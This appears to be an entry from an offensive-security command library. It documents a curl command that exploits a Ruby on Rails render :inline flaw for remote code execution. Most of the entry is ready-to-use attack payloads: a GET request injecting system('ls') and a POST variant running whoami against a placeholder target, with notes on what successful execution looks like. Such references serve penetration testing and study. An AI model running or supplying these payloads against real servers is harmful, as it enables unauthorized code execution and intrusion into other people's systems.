---
data: >-
  curl -X GET
  "http://target.com/vulnerable_controller?id=inline:%22system(%5c%22ls%5c%22)%22"
  -v
tags:
  - web
  - exploit
  - rce
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:24.895Z'
id: 699ae946-bf40-412e-b663-4af577d003bb
verified: false
validated: true
submitted: true
---
# curl-send-malicious-request

## Command

```bash
curl -X GET "http://target.com/vulnerable_controller?id=inline:%22system(%5c%22ls%5c%22)%22" -v
```

## Description

This command uses curl to send a crafted HTTP GET request to a vulnerable Ruby on Rails endpoint, injecting a payload that exploits the render method for remote code execution by specifying the :inline option with arbitrary Ruby code.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| `URL` | Target endpoint with malicious parameter | Yes |
| `-v` | Verbose output for debugging | No |

## Examples

### Basic Usage

```bash
curl -X GET "http://target.com/vulnerable_controller?id=inline:%22system(%5c%22ls%5c%22)%22" -v
```

### Advanced Usage

```bash
curl -X POST "http://target.com/vulnerable_controller" -d "id=inline:%22system(%5c%22whoami%5c%22)%22" -v
```

## Expected Output

Verbose HTTP transaction details, potentially including server response with signs of code execution such as command output in error messages or body (e.g., directory listing from 'ls').

## Related

- [[Related Procedure|procedures/Exploit-Rails-Render-Vulnerability-with-Malicious-Parameters]]
